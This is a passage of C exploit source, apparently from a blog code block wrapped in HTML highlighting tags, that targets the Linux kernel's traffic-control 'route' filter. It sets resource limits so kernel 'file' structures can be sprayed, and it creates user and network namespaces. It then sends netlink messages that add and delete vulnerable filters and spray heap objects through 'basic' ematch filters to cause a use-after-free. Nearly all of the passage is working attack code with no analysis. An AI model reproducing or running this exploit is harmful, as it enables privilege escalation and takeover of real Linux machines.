<span class="keyword">char</span>* tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setup process memory</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjust_rlimit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;  <span class="comment">// RLIMIT_NOFILE 最大打开文件描述符限制，默认为 1024, 需设置为 14096, 便于喷射 `file` 结构</span></span><br><span class="line">        rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">        spray_num_1 = <span class="number">1200</span>;</span><br><span class="line">        spray_num_2 = <span class="number">2800</span>;</span><br><span class="line">        <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] setrlimit&quot;</span>);</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;[-] setrlimit&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_namespace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> real_uid = getuid();</span><br><span class="line">    <span class="keyword">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_uid)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up process memory / working dir / namespace</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    setup_namespace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_TAIL(nmsg)                                                       \</span></span><br><span class="line"><span class="meta">  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))</span></span><br><span class="line"><span class="comment">// add attribute</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr</span><span class="params">(<span class="keyword">char</span>* attr, <span class="keyword">int</span> type, <span class="keyword">void</span>* data, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rta</span> =</span> (struct rtattr*)attr;</span><br><span class="line"></span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = RTA_LENGTH(len);</span><br><span class="line">    <span class="keyword">if</span> (len)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(attr), data, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RTA_LENGTH(len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add attribute (maxlen limitation)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_l</span><span class="params">(struct nlmsghdr* n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">int</span> alen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = RTA_LENGTH(alen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rta</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;addattr_l ERROR: message exceeded bound of %d\n&quot;</span>, maxlen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rta = NLMSG_TAIL(n);</span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = len;</span><br><span class="line">    <span class="keyword">if</span> (alen)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(rta), data, alen);</span><br><span class="line">    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct rtattr* <span class="title">addattr_nest</span><span class="params">(struct nlmsghdr* n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">nest</span> =</span> NLMSG_TAIL(n);</span><br><span class="line"></span><br><span class="line">    addattr_l(n, maxlen, type, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> nest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_nest_end</span><span class="params">(struct nlmsghdr* n, struct rtattr* nest)</span> </span>&#123;</span><br><span class="line">    nest-&gt;rta_len = (<span class="keyword">void</span>*)NLMSG_TAIL(n) - (<span class="keyword">void</span>*)nest;</span><br><span class="line">    <span class="keyword">return</span> n-&gt;nlmsg_len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add_qdisc() —— setup the socket</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_qdisc</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new qdisc                                          nlmsghdr + tcmsg</span></span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWQDISC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line">    <span class="comment">// set local</span></span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_parent = TC_H_ROOT;</span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;sfq&quot;</span>, <span class="number">4</span>);       <span class="comment">// sfq is not defaully configured, only qfq is configured</span></span><br><span class="line">    <span class="comment">// print_hex(msg, msg-&gt;nlmsg_len);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// spray 1 vulnerable object (filter) with customized flags</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">u_int32_t</span> from, <span class="keyword">u_int32_t</span> to, <span class="keyword">u_int32_t</span> handle, <span class="keyword">u_int16_t</span> flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;                               <span class="comment">// RTM_NEWTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_FROM, &amp;from, <span class="number">4</span>);              <span class="comment">// TCA_ROUTE4_FROM</span></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_TO, &amp;to, <span class="number">4</span>);                  <span class="comment">// TCA_ROUTE4_TO</span></span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle, <span class="keyword">uint16_t</span> flag)</span> </span>&#123;</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, handle, (handle &lt;&lt; <span class="number">8</span>) + handle, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc_handle</span><span class="params">(<span class="keyword">uint32_t</span> from, <span class="keyword">uint32_t</span> to)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> handle = to;</span><br><span class="line"></span><br><span class="line">    assert(from &lt;= <span class="number">0xff</span> &amp;&amp; to &lt;= <span class="number">0xff</span>);</span><br><span class="line">    handle |= from &lt;&lt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((handle &amp; <span class="number">0x7f00</span>) | handle) != handle)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span> || (handle &amp; <span class="number">0x8000</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">delete_tc_</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;                                   <span class="comment">// RTM_DELTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    delete_tc_(sockfd, ((handle) &lt;&lt; <span class="number">8</span>) + (handle));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray spray_count objects ???</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_basic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint32_t</span> handle, <span class="keyword">void</span>* spray_data, <span class="keyword">size_t</span> spray_len, <span class="keyword">int</span> spray_count)</span> </span>&#123;</span><br><span class="line">    assert(spray_len * spray_count &lt; <span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter                      nlmsghdr + tcmsg</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; <span class="comment">// | flags;</span></span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;                               <span class="comment">// RTM_NEWTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_OPTIONS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">ema_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_BASIC_EMATCHES);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_tree_hdr</span> <span class="title">tree_hdr</span> =</span> &#123; .nmatches = spray_count / <span class="number">2</span>,</span><br><span class="line">                                           .progid = <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, <span class="keyword">sizeof</span>(tree_hdr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rt_match_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_LIST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* data = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree_hdr.nmatches; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span>* current;</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x3000</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_hdr</span>* <span class="title">hdr</span> =</span> (struct tcf_ematch_hdr*)data;</span><br><span class="line">        hdr-&gt;kind = TCF_EM_META;</span><br><span class="line">        hdr-&gt;flags = TCF_EM_REL_AND;</span><br><span class="line"></span><br><span class="line">        current = data + <span class="keyword">sizeof</span>(*hdr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_meta_hdr</span> <span class="title">meta_hdr</span> =</span> &#123;</span><br><span class="line">            .left.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">            .right.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, <span class="keyword">sizeof</span>(hdr));</span><br><span class="line">        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);</span><br><span class="line">        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);</span><br><span class="line"></span><br><span class="line">        addattr_l(msg, <span class="number">0x4000</span>, i + <span class="number">1</span>, data, current - data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addattr_nest_end(msg, rt_match_tail);</span><br><span class="line">    addattr_nest_end(msg, ema_tail);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">delete_tc_basic</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;                           <span class="comment">// RTM_DELTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* 